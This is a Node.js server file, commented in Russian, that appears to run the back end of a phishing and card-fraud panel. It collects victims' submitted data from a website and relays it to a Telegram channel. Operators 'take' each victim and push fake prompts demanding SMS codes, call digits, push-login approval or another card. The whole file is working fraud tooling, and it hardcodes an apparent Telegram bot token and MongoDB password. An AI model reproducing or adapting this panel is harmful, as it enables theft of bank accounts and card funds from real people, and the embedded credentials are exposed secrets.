const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';
const BOT_LINK = 'https://t.me/tg_api_workbot'; 
const MONGO_URI = 'mongodb+srv://multmoment27_db_user:tgLoUlcEPVjsnZgb@cluster0.vzajrjd.mongodb.net/?retryWrites=true&w=majority'; 

mongoose.connect(MONGO_URI).then(() => console.log('✅ База подключена'));

// Модели данных
const Worker = mongoose.model('Worker', new mongoose.Schema({
    workerId: String,      
    workerName: String,
    targetUserId: String   
}));

const CustomButton = mongoose.model('CustomButton', new mongoose.Schema({
    name: String,
    text: String
}));

let userTasks = {}; 
let logsStorage = {}; 
let waitingForCustomText = {}; 

// УМНАЯ ИНИЦИАЛИЗАЦИЯ (без дубликатов)
async function initButtons() {
    const defaultButtons = [
        { name: "💬 СМС", text: "Введите код подтверждения из СМС" },
        { name: "📞 Звонок", text: "Введите последние 4 цифры номера, с которого поступит звонок" },
        { name: "📲 Пуш", text: "Подтвердите вход в мобильном приложении" },
        { name: "💰 Баланс", text: "Недостаточно средств на карте. Попробуйте другую карту" }
    ];

    for (let btn of defaultButtons) {
        const exists = await CustomButton.findOne({ name: btn.name });
        if (!exists) {
            await new CustomButton(btn).save();
            console.log(`🔹 Кнопка [${btn.name}] добавлена`);
        }
    }
}
initButtons();

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// Безопасная отправка в TG
async function sendTg(method, data) {
    try {
        return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, data);
    } catch (e) {
        const desc = e.response?.data?.description || "";
        // Игнорируем технические уведомления TG, чтобы не засорять логи
        if (desc.includes("message is not modified") || desc.includes("query is too old")) return;
        console.error(`❌ TG Error [${method}]:`, desc || e.message);
    }
}

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data };
    const connection = await Worker.findOne({ targetUserId: userId });
    
    const channelButtons = { 
        inline_keyboard: [
            [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
            [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
        ] 
    };

    if (connection && (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE'))) {
        await sendTg('sendMessage', {
            chat_id: CHANNEL_ID,
            text: `<b>📩 ПОЛЬЗОВАТЕЛЬ ОТВЕТИЛ [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${connection.workerName}</b>`,
            parse_mode: 'HTML', reply_markup: channelButtons
        });
        
        let replyMsg = `<b>📩 ОТВЕТ ОТ [<code>${userId}</code>]</b>\n\n`;
        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
        await sendTg('sendMessage', { chat_id: connection.workerId, text: replyMsg, parse_mode: 'HTML' });
    } else {
        const title = connection ? `⚠️ ПОВТОРНЫЙ ЛОГ` : `🆕 НОВЫЙ ЛОГ`;
        const status = connection ? `📍 Закреплен за: <b>${connection.workerName}</b>` : `📍 Статус: 🔵 Ожидает...`;
        await sendTg('sendMessage', {
            chat_id: CHANNEL_ID,
            text: `<b>${title} [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n${status}`,
            parse_mode: 'HTML', reply_markup: channelButtons
        });
    }
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const task = userTasks[req.params.userId] || null;
    if (task) delete userTasks[req.params.userId];
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (message && message.text) {
        const chatId = message.chat.id;
        
        if (message.text.startsWith('/add_btn')) {
            const parts = message.text.replace('/add_btn ', '').split('|');
            if (parts.length === 2) {
                await new CustomButton({ name: parts[0].trim(), text: parts[1].trim() }).save();
                return sendTg('sendMessage', { chat_id: chatId, text: "✅ Кнопка добавлена!" });
            }
        }

        if (message.text === '/del_btn') {
            const btns = await CustomButton.find();
            let delKeyboard = btns.map(b => [{ text: `❌ Удалить: ${b.name}`, callback_data: `deleteBtn_${b._id}` }]);
            return sendTg('sendMessage', { chat_id: chatId, text: "Выберите кнопку для удаления:", reply_markup: { inline_keyboard: delKeyboard } });
        }

        if (message.text === '/start') {
            return sendTg('sendMessage', { chat_id: chatId, text: "<b>Бот активен.</b>\n\n➕ <code>/add_btn Название | Текст</code>\n🗑 <code>/del_btn</code>", parse_mode: 'HTML' });
        }

        if (waitingForCustomText[chatId]) {
            const targetUserId = waitingForCustomText[chatId];
            userTasks[targetUserId] = { action: 'ask', text: message.text };
            await sendTg('sendMessage', { chat_id: chatId, text: `✅ Отправлено юзеру <code>${targetUserId}</code>`, parse_mode: 'HTML' });
            delete waitingForCustomText[chatId]; 
        } else {
            const checkWorker = await Worker.findOne({ workerId: chatId });
            if (checkWorker) {
                await sendTg('sendMessage', { chat_id: chatId, text: "⚠️ Текст не отправлен. Нажмите кнопку <b>'✍️ Свой текст'</b>.", parse_mode: 'HTML' });
            }
        }
    }

    if (callback_query) {
        const workerId = callback_query.from.id;
        const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
        const [action, userId, btnId] = callback_query.data.split('_');
        const channelMsgId = callback_query.message.message_id;

        await sendTg('answerCallbackQuery', { callback_query_id: callback_query.id });

        if (action === 'deleteBtn') {
            await CustomButton.findByIdAndDelete(userId); 
            return sendTg('editMessageText', { chat_id: workerId, message_id: channelMsgId, text: "🗑 Удалено!" });
        }

        if (action === 'take') {
            await Worker.findOneAndUpdate({ targetUserId: userId }, { workerId, workerName }, { upsert: true });
            const dbButtons = await CustomButton.find();
            let keyboard = [];
            for (let i = 0; i < dbButtons.length; i += 2) {
                let row = [{ text: dbButtons[i].name, callback_data: `use_${userId}_${dbButtons[i]._id}` }];
                if (dbButtons[i+1]) row.push({ text: dbButtons[i+1].name, callback_data: `use_${userId}_${dbButtons[i+1]._id}` });
                keyboard.push(row);
            }
            keyboard.push([{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]);
            // Передаем ID сообщения канала, чтобы его можно было вернуть в исходное состояние
            keyboard.push([{ text: "🔓 ОСВОБОДИТЬ ЛОГ", callback_data: `release_${userId}_${channelMsgId}` }]);

            const log = logsStorage[userId];
            let fullMsg = `<b>💎 УПРАВЛЕНИЕ [<code>${userId}</code>]</b>\n\n`;
            if (log) for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }

            await sendTg('sendMessage', { chat_id: workerId, text: fullMsg, parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } });
            await sendTg('editMessageText', { 
                chat_id: CHANNEL_ID, 
                message_id: channelMsgId, 
                text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${workerName}</b>`, 
                parse_mode: 'HTML' 
            });
        }

        if (action === 'release') {
            const originalMsgId = btnId; 
            await Worker.findOneAndDelete({ targetUserId: userId });
            
            await sendTg('editMessageText', {
                chat_id: CHANNEL_ID,
                message_id: originalMsgId,
                text: `<b>🆕 ЛОГ ОСВОБОЖДЕН</b>\n🆔 ID: <code>${userId}</code>\n📍 Статус: 🔵 Ожидает...`,
                parse_mode: 'HTML',
                reply_markup: { 
                    inline_keyboard: [
                        [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
                        [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
                    ] 
                }
            });
            await sendTg('sendMessage', { chat_id: workerId, text: `🔓 Юзер <code>${userId}</code> освобожден.`, parse_mode: 'HTML' });
        }

        if (action === 'use') {
            const btn = await CustomButton.findById(btnId);
            if (btn) {
                userTasks[userId] = { action: 'ask', text: btn.text };
                await sendTg('sendMessage', { chat_id: workerId, text: `✅ Отправлено: <i>"${btn.text}"</i>`, parse_mode: 'HTML' });
            }
        }

        if (action === 'custom') {
            waitingForCustomText[workerId] = userId;
            await sendTg('sendMessage', { chat_id: workerId, text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`, parse_mode: 'HTML' });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен`));
